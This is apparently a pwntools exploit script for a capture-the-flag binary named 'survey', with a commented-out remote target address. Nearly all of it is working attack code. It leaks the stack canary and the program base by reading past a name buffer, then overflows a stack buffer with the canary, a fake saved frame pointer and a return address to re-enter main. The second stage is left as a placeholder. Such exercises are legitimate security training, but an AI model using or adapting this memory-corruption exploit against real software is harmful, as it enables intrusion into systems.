#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('./survey')

# Byte sequence alias
A8 = 8 * b'A'

def main():
    '''
    1. Leak stack canary via fmt attack
    2. Return to main()'s 2nd read() again
       - main()'s 2nd read: 0x5558b3315292
       - main()'s ret_addr: 0x7f83471c1152
    '''
    # proc = remote('140.112.31.97', 30201)
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    raw_input()

    # Develop your exploit here
    proc.recvuntil('name : ')
    proc.send(b'A' * 25)

    # Leak stack canary (8 bytes) via fmt
    proc.recvuntil('Hello, ' + 'A' * 25)

    canary = u64(b'\x00' + proc.recv(7))
    log.info('leaked canary: {}'.format(hex(canary)))

    __libc_csu_init = u64(proc.recv(6).ljust(8, b'\x00'))
    elf_base = __libc_csu_init - (0x559b16c6b2f0 - 0x559b16c6b000)
    elf_bss = elf_base + (0x561846a350f8 - 0x561846a32000)
    log.info('leaked ELF base: {}'.format(hex(elf_base)))
    log.info('leaded ELF bss:  {}'.format(hex(elf_bss)))

    main_2nd_read = elf_base + (0x55576e52d292  - 0x55576e52d000)
    elf_main = main_2nd_read - (0x1292 - 0x1241)
    log.info('leaked main()\'s 2nd read(): {}'.format(hex(main_2nd_read)))
    log.info('leaded main(): {}'.format(hex(elf_main)))

    # Write to the same stack buf again and overflow it,
    # but this time with the leaked canary
    proc.recvuntil('here : ')
    payload  = b'A' * 24           # padding
    payload += p64(canary)         # canary
    payload += p64(elf_bss)        # saved rbp
    payload += p64(elf_main)       # ret addr
    proc.send(payload)

    # Write new payload to elf_bss
    payload  = A8
    proc.send(payload)

    proc.interactive()


if __name__ == '__main__':
    main()
